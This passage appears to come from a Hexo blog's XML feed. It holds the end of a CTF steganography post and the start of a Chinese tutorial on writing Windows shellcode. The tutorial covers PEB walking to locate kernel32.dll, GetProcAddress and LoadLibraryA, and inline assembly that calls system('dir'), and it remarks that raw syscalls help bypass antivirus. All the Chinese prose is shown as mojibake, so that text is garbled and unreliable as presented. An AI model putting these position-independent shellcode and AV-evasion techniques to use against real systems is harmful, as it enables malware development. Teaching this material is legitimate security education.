ç”Ÿæˆå›¾.jpg</span><br><span class="line"></span><br><span class="line">å›¾ç‰‡æ°´å°è§£ç :</span><br><span class="line">java -jar BlindWatermark-v0.0.3-windows-x86_64.jar decode -c ç”Ÿæˆå›¾.jpg è§£ç å¾—åˆ°çš„æ°´å°å›¾.jpg</span><br></pre></td></tr></table></figure><h2 id="9-silenteyeéšå†™"><a href="#9-silenteyeéšå†™" class="headerlink" title="9.silenteyeéšå†™"></a>9.silenteyeéšå†™</h2><p><a href="https://pan.baidu.com/s/1eaXYeb2tad5ApIEDYmdwhQ#list/path=%2F">ä¸‹è½½åœ°å€</a>ï¼ˆæå–ç ï¼šqph2ï¼‰</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4266773398.png" alt="img"></p><p>è¿™ä¸æ˜¯éŸ³é¢‘éšå†™ä¹ˆï¼Ÿç«Ÿä¹Ÿæœ‰å›¾ç‰‡éšå†™ç”¨çš„ä¸Šä»–<br><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3538984511.png" alt="img"></p><p>å¾…ç»­â€¦</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> éšå†™ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>shellcodeç¼–å†™æŒ‡å—</title>
      <link href="2021/02/24/shellcode%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97/"/>
      <url>2021/02/24/shellcode%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97/</url>
      
        <content type="html"><![CDATA[<h1 id="1-å‰è¨€"><a href="#1-å‰è¨€" class="headerlink" title="1.å‰è¨€"></a>1.å‰è¨€</h1><p>linuxçš„shellcodeå°±ä¸ç”¨è¯´äº†ï¼Œç›´æ¥é€šè¿‡ä¸€ä¸ªint 0x80ç³»ç»Ÿè°ƒç”¨ï¼ŒæŒ‡å®šæƒ³è°ƒç”¨çš„å‡½æ•°çš„ç³»ç»Ÿè°ƒç”¨å·ï¼ˆsyscallï¼‰ï¼Œä¼ å…¥è°ƒç”¨å‡½æ•°çš„å‚æ•°ï¼Œå³å¯ï¼Œæ‡‚çš„éƒ½æ‡‚ã€‚</p><p>åœ¨windowsä¸­ï¼Œæ²¡æœ‰åƒint 0x80ç³»ç»Ÿè°ƒç”¨åŠŸèƒ½æ¥æ‰¾ç›¸åº”çš„å‡½æ•°ï¼Œä½†æ˜¯ä¹Ÿæœ‰syscallè¿™æ ·çš„ç³»ç»Ÿè°ƒç”¨ï¼Œè¿‡AVå¥‡æ•ˆï¼Œè¿™é‡Œä¸»è¦ä»‹ç»çš„æ˜¯å¦‚ä½•æ‰‹åŠ¨å»é€šè¿‡GetProcAddresså»æŸ¥æ‰¾æŸä¸ªå‡½æ•°çš„åœ°å€ï¼Œç„¶åè¿›è¡Œè°ƒç”¨ï¼Œè¿™é‡Œéœ€è¦ä¸€ä¸¢ä¸¢cåŸºç¡€å’Œæ±‡ç¼–åŸºç¡€ã€‚</p><h1 id="2-åŸç†"><a href="#2-åŸç†" class="headerlink" title="2.åŸç†"></a>2.åŸç†</h1><p>åœ¨windowsä¸­ï¼Œæˆ‘ä»¬éœ€è¦å¦‚ä¸‹æ­¥éª¤å»æ‰¾åˆ°ç›¸åº”çš„å‡½æ•°ï¼Œè¿›è¡Œè°ƒç”¨ï¼š</p><blockquote><p>1ï¼‰æ‰¾åˆ°PEBè¡¨ï¼Œè·å–Kernel32.dll baseåœ°å€<br>2)é€šè¿‡kernel32.dll PEæ–‡ä»¶æ ¼å¼æ‰¾åˆ°å¯¼å‡ºè¡¨çš„åœ°å€<br>3)é€šè¿‡å¯¼å‡ºè¡¨å®šä½GetProcAddressçš„RVA<br>4ï¼‰é€šè¿‡GetProcAddresså‡½æ•°æ‰¾åˆ°LoadLibraryAå‡½æ•°åœ°å€<br>5ï¼‰é€šè¿‡è¿™GetProcAddresså’ŒLoadLibraryAä¸¤ä¸ªå‡½æ•°æ¥åŠ è½½dllæ–‡ä»¶å’ŒæŸ¥æ‰¾å‡½æ•°ä»¥ä¾›ä½¿ç”¨</p></blockquote><p>å…ˆäº†è§£å‡ ä¸ªåŸºæœ¬æ¦‚å¿µï¼Œapiå‡½æ•°ï¼ŒåŠ¨æ€é“¾æ¥åº“æ–‡ä»¶ã€‚</p><h2 id="2-1-kernel32-dll"><a href="#2-1-kernel32-dll" class="headerlink" title="2.1 kernel32.dll"></a>2.1 kernel32.dll</h2><p>å®šä¹‰ï¼škernel32.dllæ˜¯windowsä¸­éå¸¸é‡è¦çš„32ä½åŠ¨æ€é“¾æ¥åº“æ–‡ä»¶ï¼Œå·¥ä½œåœ¨ringoï¼Œå±äºå†…æ ¸çº§æ–‡ä»¶ï¼Œå®ƒæ§åˆ¶ç€ç³»ç»Ÿçš„å†…å­˜ç®¡ç†ã€æ•°æ®çš„è¾“å…¥è¾“å‡ºæ“ä½œå’Œä¸­æ–­å¤„ç†ï¼Œå½“Windowså¯åŠ¨æ—¶ï¼Œkernel32.dllå°±é©»ç•™åœ¨å†…å­˜ä¸­ç‰¹å®šçš„å†™ä¿æŠ¤åŒºåŸŸï¼Œä½¿åˆ«çš„ç¨‹åºæ— æ³•å ç”¨è¿™ä¸ªå†…å­˜åŒºåŸŸï¼Œæä¾›äº†954ä¸ªå¯ä¾›è°ƒç”¨apiã€‚</p><p>$$ 2.2 GetProcAddress</p><p>å®šä¹‰ï¼šGetProcAddressæ˜¯ä¸€ä¸ªè®¡ç®—æœºå‡½æ•°ï¼ŒåŠŸèƒ½æ˜¯æ£€ç´¢æŒ‡å®šçš„åŠ¨æ€é“¾æ¥åº“(DLL)ä¸­çš„è¾“å‡ºåº“å‡½æ•°åœ°å€</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">FARPROC GetProcAddress(</span><br><span class="line">HMODULE hModule, &#x2F;&#x2F; DLLæ¨¡å—å¥æŸ„ï¼Œå¯é€šè¿‡LoadLibraryã€AfxLoadLibrary æˆ–è€…GetModuleHandleå‡½æ•°è¿”å›æ­¤å¥æŸ„ã€‚</span><br><span class="line">LPCSTR lpProcName &#x2F;&#x2F; å‡½æ•°å</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>å¦‚æœå‡½æ•°æŸ¥æ‰¾æˆåŠŸï¼Œè¿”å›å€¼æ˜¯DLLä¸­çš„è¾“å‡ºå‡½æ•°åœ°å€ï¼Œå¦‚æœå‡½æ•°è°ƒç”¨å¤±è´¥ï¼Œè¿”å›å€¼æ˜¯NULL</p><p>åŠ¨æ€é“¾æ¥åº“DLLçš„è¿›ç¨‹ä¼šè°ƒç”¨GetProcAddressæ¥è·å–DLLä¸­å¯¼å‡ºå‡½æ•°çš„åœ°å€ã€‚</p><h2 id="2-3-LoadLibrary"><a href="#2-3-LoadLibrary" class="headerlink" title="2.3 LoadLibrary"></a>2.3 LoadLibrary</h2><p>å°†æŒ‡å®šçš„æ¨¡å—åŠ è½½åˆ°è°ƒç”¨è¿›ç¨‹çš„åœ°å€ç©ºé—´ä¸­ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HMODULE LoadLibraryA(  LPCSTR lpLibFileName );&#x2F;&#x2F;æ¨¡å—çš„åç§°ï¼Œå¯ä»¥æ˜¯åº“æ¨¡å—ï¼ˆ.dllæ–‡ä»¶ï¼‰æˆ–å¯æ‰§è¡Œæ¨¡å—ï¼ˆ.exeæ–‡ä»¶ï¼‰ã€‚</span><br></pre></td></tr></table></figure><p>å¦‚æœå‡½æ•°æˆåŠŸï¼Œåˆ™è¿”å›å€¼æ˜¯æ¨¡å—çš„å¥æŸ„ï¼Œå¦‚æœå‡½æ•°å¤±è´¥ï¼Œåˆ™è¿”å›å€¼ä¸ºNULLã€‚</p><h2 id="2-4-PEæ–‡ä»¶æ ¼å¼"><a href="#2-4-PEæ–‡ä»¶æ ¼å¼" class="headerlink" title="2.4 PEæ–‡ä»¶æ ¼å¼"></a>2.4 PEæ–‡ä»¶æ ¼å¼</h2><p>PEæ–‡ä»¶çš„å…¨ç§°æ˜¯Portable Executableï¼Œæ„ä¸ºå¯ç§»æ¤çš„å¯æ‰§è¡Œçš„æ–‡ä»¶ï¼Œå¸¸è§çš„EXEã€DLLã€OCXã€SYSã€COMéƒ½æ˜¯PEæ–‡ä»¶</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2516431772.png"></p><p>ä¸å¤šè®²äº†ï¼Œä¸€å¼ å›¾å°±è¡Œï¼ŒPEæ–‡ä»¶æ ¼å¼å†…å®¹è¦è¯´å¤šï¼Œä¸“é—¨æœ‰ä¸€æœ¬ä¹¦æ¥è®²PEæ–‡ä»¶ç»“æ„ï¼Œè¦è¯´ç®€å•ï¼Œä¸€å¼ å›¾å°±èƒ½æ¦‚æ‹¬ï¼Œå¦‚æœä¸æ˜¯ä¸ºäº†å»å†™å£³ï¼Œè„±å£³â€¦â€¦.æ ¹æœ¬ä¸éœ€è¦çŸ¥é“é‚£ä¹ˆå¤šã€‚</p><h2 id="2-5-PEB"><a href="#2-5-PEB" class="headerlink" title="2.5 PEB"></a>2.5 PEB</h2><p>åœ¨Windowsæ“ä½œç³»ç»Ÿä¸­ï¼ŒPEBæ˜¯ä¸€ä¸ªä½äºæ‰€æœ‰è¿›ç¨‹å†…å­˜ä¸­å›ºå®šä½ç½®çš„ç»“æ„ä½“,æ­¤ç»“æ„ä½“åŒ…å«å…³äºè¿›ç¨‹çš„æœ‰ç”¨ä¿¡æ¯ï¼Œå¦‚å¯æ‰§è¡Œæ–‡ä»¶åŠ è½½åˆ°å†…å­˜çš„ä½ç½®ï¼Œæ¨¡å—åˆ—è¡¨ï¼ˆDLLï¼‰ï¼ŒæŒ‡ç¤ºè¿›ç¨‹æ˜¯å¦è¢«è°ƒè¯•çš„æ ‡å¿—ï¼Œè¿˜æœ‰è®¸å¤šå…¶ä»–çš„ä¿¡æ¯ã€‚</p><p>å¾®è½¯å®šä¹‰ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">typedef struct _PEB &#123;</span><br><span class="line">  BYTE                          Reserved1[2];</span><br><span class="line">  BYTE                          BeingDebugged;</span><br><span class="line">  BYTE                          Reserved2[1];</span><br><span class="line">  PVOID                         Reserved3[2];</span><br><span class="line">  PPEB_LDR_DATA                 Ldr;&#x2F;&#x2F;åç§»4+2*4</span><br><span class="line">  PRTL_USER_PROCESS_PARAMETERS  ProcessParameters;</span><br><span class="line">  PVOID                         Reserved4[3];</span><br><span class="line">  PVOID                         AtlThunkSListPtr;</span><br><span class="line">  PVOID                         Reserved5;</span><br><span class="line">  ULONG                         Reserved6;</span><br><span class="line">  PVOID                         Reserved7;</span><br><span class="line">  ULONG                         Reserved8;</span><br><span class="line">  ULONG                         AtlThunkSListPtr32;</span><br><span class="line">  PVOID                         Reserved9[45];</span><br><span class="line">  BYTE                          Reserved10[96];</span><br><span class="line">  PPS_POST_PROCESS_INIT_ROUTINE PostProcessInitRoutine;</span><br><span class="line">  BYTE                          Reserved11[128];</span><br><span class="line">  PVOID                         Reserved12[1];</span><br><span class="line">  ULONG                         SessionId;</span><br><span class="line">&#125; PEB, *PPEB;</span><br></pre></td></tr></table></figure><p>åœ¨64ä½ä¸Šçš„å®šä¹‰ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">typedef struct _PEB &#123;</span><br><span class="line">    BYTE Reserved1[2];</span><br><span class="line">    BYTE BeingDebugged;</span><br><span class="line">    BYTE Reserved2[21];</span><br><span class="line">    PPEB_LDR_DATA LoaderData;</span><br><span class="line">    PRTL_USER_PROCESS_PARAMETERS ProcessParameters;</span><br><span class="line">    BYTE Reserved3[520];</span><br><span class="line">    PPS_POST_PROCESS_INIT_ROUTINE PostProcessInitRoutine;</span><br><span class="line">    BYTE Reserved4[136];</span><br><span class="line">    ULONG SessionId;</span><br><span class="line">&#125; PEB;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬é‡ç‚¹å…³æ³¨ç»“æ„ä½“PEB_LDR_DATAé‡Œé¢çš„å†…å®¹ï¼ŒåŒ…å«å¦‚ä¸‹ä¿¡æ¯(è¯¥ç»“æ„åŒ…å«æœ‰å…³è¿›ç¨‹çš„å·²åŠ è½½æ¨¡å—çš„ä¿¡æ¯)ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">typedef struct _PEB_LDR_DATA &#123;</span><br><span class="line">  BYTE       Reserved1[8];&#x2F;&#x2F;ä¿ç•™ä¾›æ“ä½œç³»ç»Ÿå†…éƒ¨ä½¿ç”¨ã€‚</span><br><span class="line">  PVOID      Reserved2[3];&#x2F;&#x2F;ä¿ç•™ä¾›æ“ä½œç³»ç»Ÿå†…éƒ¨ä½¿ç”¨</span><br><span class="line">  LIST_ENTRY InMemoryOrderModuleList;&#x2F;&#x2F;åŒå‘é“¾æ¥åˆ—è¡¨çš„å¤´éƒ¨ï¼Œè¯¥åˆ—è¡¨åŒ…å«è¯¥è¿‡ç¨‹çš„å·²åŠ è½½æ¨¡å—ã€‚åˆ—è¡¨ä¸­çš„æ¯ä¸ªé¡¹ç›®éƒ½æ˜¯æŒ‡å‘LDR_DATA_TABLE_ENTRYç»“æ„çš„æŒ‡é’ˆ,åç§»ä¸º8+3x4</span><br><span class="line">&#125; PEB_LDR_DATA, *PPEB_LDR_DATA;</span><br></pre></td></tr></table></figure><p>LIST_ENTRYç»“æ„æ˜¯ä¸€ä¸ªç®€å•çš„åŒå‘é“¾è¡¨ï¼ŒåŒ…å«æŒ‡å‘ä¸‹ä¸€ä¸ªå…ƒç´ ï¼ˆFlinkï¼‰çš„æŒ‡é’ˆå’ŒæŒ‡å‘ä¸Šä¸€ä¸ªå…ƒç´ çš„æŒ‡é’ˆï¼ˆBlinkï¼‰</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">typedef struct _LIST_ENTRY &#123;</span><br><span class="line">   struct _LIST_ENTRY *Flink;</span><br><span class="line">   struct _LIST_ENTRY *Blink;</span><br><span class="line">&#125; LIST_ENTRY, *PLIST_ENTRY, *RESTRICTED_POINTER PRLIST_ENTRY;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬éœ€è¦é€šè¿‡LDR_DATA_TABLE_ENTRYç»“æ„ä½“æ¥è·å–å·²åŠ è½½DLLçš„ä¿¡æ¯ç»“æ„ä½“ä¸ºï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">typedef struct _LDR_DATA_TABLE_ENTRY</span><br><span class="line">&#123;</span><br><span class="line">    LIST_ENTRY InLoadOrderLinks; &#x2F;* 0x00 *&#x2F;</span><br><span class="line">    LIST_ENTRY InMemoryOrderLinks; &#x2F;* 0x08ï¼Œè¿™é‡Œæ˜¯FlinkæŒ‡å‘çš„åœ°æ–¹ *&#x2F; </span><br><span class="line">    LIST_ENTRY InInitializationOrderLinks; &#x2F;* 0x10 *&#x2F;</span><br><span class="line">    PVOID DllBase; &#x2F;* 0x18 *&#x2F;</span><br><span class="line">    PVOID EntryPoint;</span><br><span class="line">    ULONG SizeOfImage;</span><br><span class="line">    UNICODE_STRING FullDllName; &#x2F;* 0x24 *&#x2F;</span><br><span class="line">    UNICODE_STRING BaseDllName; &#x2F;* 0x28 *&#x2F;</span><br><span class="line">    ULONG Flags;</span><br><span class="line">    WORD LoadCount;</span><br><span class="line">    WORD TlsIndex;</span><br><span class="line">    union</span><br><span class="line">    &#123;</span><br><span class="line">         LIST_ENTRY HashLinks;</span><br><span class="line">         struct</span><br><span class="line">         &#123;</span><br><span class="line">              PVOID SectionPointer;</span><br><span class="line">              ULONG CheckSum;</span><br><span class="line">         &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">    union</span><br><span class="line">    &#123;</span><br><span class="line">         ULONG TimeDateStamp;</span><br><span class="line">         PVOID LoadedImports;</span><br><span class="line">    &#125;;</span><br><span class="line">    _ACTIVATION_CONTEXT * EntryPointActivationContext;</span><br><span class="line">    PVOID PatchInformation;</span><br><span class="line">    LIST_ENTRY ForwarderLinks;</span><br><span class="line">    LIST_ENTRY ServiceTagLinks;</span><br><span class="line">    LIST_ENTRY StaticLinks;</span><br><span class="line">&#125; LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;</span><br></pre></td></tr></table></figure><p>InMemoryOrderModuleListå­—æ®µæ˜¯ä¸€ä¸ªæŒ‡é’ˆï¼ŒæŒ‡å‘LDR_DATA_TABLE_ENTRY ç»“æ„ä½“ä¸Šçš„LIST_ENTRYå­—æ®µï¼Œä½†æ˜¯å®ƒä¸æ˜¯æŒ‡å‘LDR_DATA_TABLE_ENTRY èµ·å§‹ä½ç½®çš„æŒ‡é’ˆï¼Œè€Œæ˜¯æŒ‡å‘è¿™ä¸ªç»“æ„çš„InMemoryOrderLinkså­—æ®µã€‚</p><h1 id="3-ç¼–å†™shellcode"><a href="#3-ç¼–å†™shellcode" class="headerlink" title="3.ç¼–å†™shellcode"></a>3.ç¼–å†™shellcode</h1><h2 id="3-1-c-åº“æ–‡ä»¶é…åˆå†…è”æ±‡ç¼–"><a href="#3-1-c-åº“æ–‡ä»¶é…åˆå†…è”æ±‡ç¼–" class="headerlink" title="3.1 c++åº“æ–‡ä»¶é…åˆå†…è”æ±‡ç¼–"></a>3.1 c++åº“æ–‡ä»¶é…åˆå†…è”æ±‡ç¼–</h2><p>å…ˆæ¥é’ˆå¯¹æŒ‡å®šç³»ç»Ÿçš„shellcodeçš„ç¼–å†™ï¼ŒæŒ‡å®šç³»ç»Ÿçš„,æˆ‘ä»¬é¦–å…ˆé€šè¿‡LoadLibraryAå‡½æ•°å¯¼å…¥ç›¸åº”çš„dllæ–‡ä»¶ï¼Œè·å¾—ä¸€ä¸ªdllå¥æŸ„ï¼Œåœ¨æŠŠè¿™ä¸ªdllå¥æŸ„å½“ä½œå‚æ•°ä¼ å…¥GetProcAddress æœç´¢æŸ¥æ‰¾æŒ‡å®šå‡½æ•°ï¼Œè¿”å›è¯¥å‡½æ•°çš„åœ°å€ï¼Œç„¶åé€šè¿‡å‡½æ•°çš„åœ°å€æ¥è°ƒç”¨å‡½æ•°ï¼Œç”¨c++ä»£ç å†…è”æ±‡ç¼–å®ç°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;Windows.h&gt;</span><br><span class="line">#include&lt;iostream&gt;</span><br><span class="line">#include&lt;string.h&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">  string cmd &#x3D; &quot;dir&quot;;</span><br><span class="line">  HINSTANCE Libhandle &#x3D; LoadLibraryA(&quot;msvcrt.dll&quot;); &#x2F;&#x2F;åŠ è½½dllæ–‡ä»¶</span><br><span class="line">  if (Libhandle &#x3D;&#x3D; NULL)</span><br><span class="line">  &#123;</span><br><span class="line">    return 0;</span><br><span class="line">  &#125;</span><br><span class="line">  &#x2F;&#x2F;system(&quot;dir&quot;);</span><br><span class="line">  cout &lt;&lt;&quot;msvcrt Address &#x3D; &quot;&lt;&lt; Libhandle &lt;&lt; endl;</span><br><span class="line">  LPTSTR getaddr &#x3D; (LPTSTR)GetProcAddress(Libhandle, &quot;system&quot;);&#x2F;&#x2F;è·å¾—systemå‡½æ•°çš„åœ°å€</span><br><span class="line">  cout &lt;&lt; &quot;system Address &#x3D; &quot; &lt;&lt; getaddr &lt;&lt; endl;</span><br><span class="line">  &#x2F;&#x2F;é€šè¿‡æ±‡ç¼–ä»£ç æ¥è°ƒç”¨å‡½æ•°</span><br><span class="line">    _asm&#123;</span><br><span class="line">            &#x2F;&#x2F;system(&quot;dir&quot;); &#x2F;&#x2F;64 69 72</span><br><span class="line">            pushad</span><br><span class="line">            pushfd</span><br><span class="line">            xor ebx, ebx</span><br><span class="line"></span><br><span class="line">            mov ebx,0x726964  ;è¿™é‡Œéœ€è¦æ³¨æ„æ•°æ®å…¥æ ˆçš„é¡ºåº</span><br><span class="line">            push ebx</span><br><span class="line"></span><br><span class="line">            push esp</span><br><span class="line"></span><br><span class="line">            mov ebx, getaddr</span><br><span class="line">            call ebx</span><br><span class="line"></span><br><span class="line">            add esp,8</span><br><span class="line"></span><br><span class="line">            popfd</span><br><span class="line">            popad</span><br><span class="line">    &#125;</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¼šå¾—åˆ°è¿™ä¸ªæ•ˆæœ</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3148187291.jpg"></p><p>ä½†æ˜¯è¿™æ˜¯c++ä»£ç å»åŠ è½½ç›¸åº”å¤´æ–‡ä»¶ï¼Œç›´æ¥è°ƒç”¨LoadLibraryAæ¥åŠ è½½ï¼Œå…·æœ‰å±€é™æ€§ï¼Œæ— æ³•ç§»æ¤çš„shellcodeï¼Œä¸”é‚£æ®µå†…è”æ±‡ç¼–ä»£ç å¿…é¡»åœ¨å¯¼å…¥ç›¸åº”é“¾æ¥åº“å¾—æƒ…å†µæ‰èƒ½æ‰§è¡Œï¼Œä¸ç„¶ä¼šæŠ¥é”™ã€‚</p><p>è¿™é‡Œè¡¥å……ä¸€ç‚¹çŸ¥è¯†ï¼š</p><blockquote><p>å…¶å®ç¨‹åºæœ€å¼€å§‹åŠ è½½å¹¶ä¸æ˜¯ä»mainå‡½æ•°çš„ï¼Œmainå‡½æ•°ä¹Ÿæ˜¯åˆ«çš„å‡½æ•°è°ƒç”¨æ‰§è¡Œçš„ã€‚</p><p>1.é¦–å…ˆæ“ä½œç³»ç»Ÿå¿…é¡»çš„åˆ›å»ºè¿›ç¨‹ï¼Œç„¶åjmpåˆ°è¿™ä¸ªè¿›ç¨‹çš„å…¥å£å‡½æ•°</p><p>2.ç„¶åç»è¿‡ä¸€ç³»åˆ—çš„åˆå§‹åŒ–</p><p>3.å®Œæˆåˆå§‹åŒ–ä¹‹åï¼Œè°ƒç”¨mainå‡½æ•°ï¼Œå¼€å§‹æ‰§è¡Œç¨‹åºä¸»ä½“ã€‚</p></blockquote><p>æ‰€ä»¥è¯´ï¼Œæˆ‘ä»¬è¿™é‡Œæˆ‘ä»¬ç›´æ¥ç”¨BinaryNinjaæ‰“å¼€ï¼Œæ‰¾åˆ°å¯æ‰§è¡Œæ–‡ä»¶çš„å…¥å£ç‚¹å¹¶ä¸æ˜¯mainå‡½æ•°å…¥å£ç‚¹</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4120466773.jpg"></p><p>ä»–ä¼šå…ˆä»åˆå§‹åŒ–å‡½æ•°å¼€å§‹ï¼ˆè¿™é‡Œæ˜¯ç¼–è¯‘å™¨ç»™æˆ‘åŠ çš„ï¼‰,ä¸€ç›´æ‰§è¡Œåˆ°æˆ‘ä»¬mianå‡½æ•°</p><h2 id="3-2-ä»PEBè¡¨æŸ¥æ‰¾LoadLibraryAï¼ŒGetProcAddress"><a href="#3-2-ä»PEBè¡¨æŸ¥æ‰¾LoadLibraryAï¼ŒGetProcAddress" class="headerlink" title="3.2 ä»PEBè¡¨æŸ¥æ‰¾LoadLibraryAï¼ŒGetProcAddress"></a>3.2 ä»PEBè¡¨æŸ¥æ‰¾LoadLibraryAï¼ŒGetProcAddress</h2><p>åœ¨ä¸Šé¢è®²äº†ï¼Œè™½ç„¶æˆ‘ä»¬é€šè¿‡c++åº“æ‹¿åˆ°äº†LoadLibraryAå’ŒGetProcAddresså‡½æ•°ï¼Œä½†æ˜¯åœ¨å®é™…çš„æƒ…å†µä¸‹å¹¶ä¸å®ç”¨ï¼Œå› ä¸ºå®é™…æƒ…å†µä¸‹å¹¶æ²¡æœ‰c++åº“ç»™æˆ‘ä»¬è°ƒç”¨ï¼Œæ‰€ä»¥è¿™æ—¶å€™å°±ä½“ç°äº†PEBè¡¨çš„ä¼˜åŠ¿åœ¨ï¼Œå› ä¸ºPEBè¡¨æ˜¯ä½äºæ‰€æœ‰è¿›ç¨‹å†…å­˜ä¸­å›ºå®šä½ç½®çš„ç»“æ„ä½“ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨ä»»æ„è¿›ç¨‹é‡Œéƒ½èƒ½æ‰¾åˆ°PEBè¡¨ï¼Œé€šè¿‡PEBè¡¨æ‰¾åˆ°kernel32.dllï¼Œä»Kernel32.dllä¸­æ‰¾åˆ°LoadLibraryAï¼Œå’ŒGetProcAddressè¿™ä¸ªä¸¤ä¸ªå‡½æ•°ï¼Œè¿™æ ·å°±è§£å†³äº†å¯ç§»æ¤æ€§çš„é—®é¢˜ã€‚</p><p>è¿™é‡Œé¦–å…ˆè¿˜å¾—äº†è§£ä¸€ä¸ªéå¸¸é‡è¦çš„æ¦‚å¿µï¼ŒFSæ®µå¯„å­˜å™¨ï¼Œåœ¨æˆ‘ä»¬ä»‹ç»Kernel32.dllæ—¶å€™ï¼Œè¯´äº†å·¥ä½œåœ¨ringoï¼Œå±äºå†…æ ¸çº§æ–‡ä»¶ï¼Œä¸ä¹‹ç›¸å¯¹åº”çš„User32.dll å·¥ä½œåœ¨ring3ï¼Œå±äºç”¨æˆ·çº§æ–‡ä»¶ï¼Œè¿™é‡Œå°±æ¶‰åŠäº†å†…æ ¸æ€å’Œç”¨æˆ·æ€ï¼Œä¸è®²æ·±äº†ï¼Œä½ åªéœ€è¦çŸ¥é“æˆ‘ä»¬çš„ç¨‹åºè™½ç„¶åœ¨ç”¨æˆ·å±‚é‡Œè¿è¡Œï¼Œä½†æ˜¯æœ‰æ—¶å€™ä¹Ÿéœ€è¦åˆ‡æ¢åˆ°å†…æ ¸çŠ¶æ€ã€‚</p><p>è€ŒFSå¯„å­˜å™¨çš„æ”¹å˜ï¼Œå°±æ„å‘³ç€ç¨‹åºåœ¨R3å’ŒR0ä¹‹é—´è¿›è¡Œåˆ‡æ¢ï¼ˆéƒ½æ˜¯åœ¨R0ä¸‹ç»™FSèµ‹ä¸åŒå€¼çš„ï¼‰ï¼Œåœ¨R3ä¸‹ï¼šFSæ®µå¯„å­˜å™¨çš„å€¼æ˜¯0x3B,åœ¨R0ä¸‹ï¼šFSæ®µå¯„å­˜å™¨çš„å€¼æ˜¯0x30ï¼Œæ³¨æ„è¿™é‡Œ0x30å’Œ0x3B 